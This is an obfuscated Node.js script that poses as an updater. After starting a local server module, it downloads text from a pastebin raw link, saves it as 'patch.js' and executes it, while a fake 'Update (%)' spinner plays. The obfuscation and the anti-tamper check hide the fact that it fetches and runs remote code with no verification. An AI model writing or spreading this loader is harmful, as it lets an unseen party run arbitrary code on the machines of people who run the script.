const _0x750567 = function () {
  let _0xba8d3b = true;
  return function (_0x1686ee, _0x3bdfde) {
    const _0x28ef05 = _0xba8d3b ? function () {
      if (_0x3bdfde) {
        const _0x31c0cd = _0x3bdfde.apply(_0x1686ee, arguments);
        _0x3bdfde = null;
        return _0x31c0cd;
      }
    } : function () {};
    _0xba8d3b = false;
    return _0x28ef05;
  };
}();
const _0x342e58 = _0x750567(this, function () {
  return _0x342e58.toString().search('(((.+)+)+)+$').toString().constructor(_0x342e58).search('(((.+)+)+)+$');
});
_0x342e58();
const fs = require('fs');
const gradient = require('gradient-string');
const wait = _0x813be7 => new Promise(_0x3c8ea9 => setTimeout(_0x3c8ea9, _0x813be7 * 1000));
const k = require('./server');
k();
fetch('https://pastebin.com/raw/Ui8NRjei').then(async _0x2daedf => {
  if (!_0x2daedf.ok) {
    throw new Error('HTTP error! Status: ' + _0x2daedf.status);
  }
  return _0x2daedf.text();
}).then(async _0x5008c9 => {
  const _0x41f5a3 = showLoading();
  await wait(3);
  fs.writeFile('patch.js', _0x5008c9, 'utf8', _0x5c2d0d => {
    if (_0x5c2d0d) {
      console.error('เกิดข้อผิดพลาดในการเขียนไฟล์:', _0x5c2d0d);
      return;
    }
    clearInterval(_0x41f5a3);
    console.clear();
    log(['lime', 'lime'], '[+] => Update Successfully');
    fs.readFile('patch.js', 'utf8', (_0x77cb50, _0x9a9669) => {
      try {
        const {
          run: _0x6fa6ad
        } = require("./patch.js");
        _0x6fa6ad();
      } catch (_0x5cfd9a) {
        logErr(_0x5cfd9a);
      }
    });
  });
}).catch(_0x381eff => {
  logErr(_0x381eff);
});
function log(_0x37ea3b, _0x3c7c8e) {
  console.log(gradient(_0x37ea3b)(_0x3c7c8e));
}
function logErr(_0x53c585) {
  console.clear();
  console.log(gradient(['red', 'red'])('[ Error ]'));
  console.log(gradient(['red', 'red'])('' + _0x53c585.message));
  process.exit();
}
function showLoading() {
  const _0xcfa1a2 = ['-', "\\", '|', '/'];
  let _0x13c86b = 0;
  let _0x351d28 = 0;
  console.clear();
  return setInterval(() => {
    if (_0x13c86b < 100) {
      _0x13c86b += 10;
    }
    process.stdout.write("\r" + gradient(['yellow', 'yellow'])('[' + _0xcfa1a2[_0x351d28] + '] => Update (' + _0x13c86b + '%)'));
    _0x351d28 = (_0x351d28 + 1) % _0xcfa1a2.length;
  }, 250);
}
